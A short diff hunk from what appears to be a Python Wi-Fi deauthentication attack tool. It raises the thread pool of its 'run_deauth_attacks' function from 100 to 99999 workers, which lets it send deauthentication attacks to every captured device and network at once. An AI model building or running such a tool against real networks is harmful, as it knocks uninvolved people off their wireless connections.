@@ -28,7 +28,7 @@ def capture_mac_addresses(interface):
     return set(mac_addresses)
 
 def run_deauth_attacks(maccy, interface, packet_count, interval):
-    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
+    with concurrent.futures.ThreadPoolExecutor(max_workers=99999) as executor:
         for wifi in maccy:
             for device in maccy:
                 try:
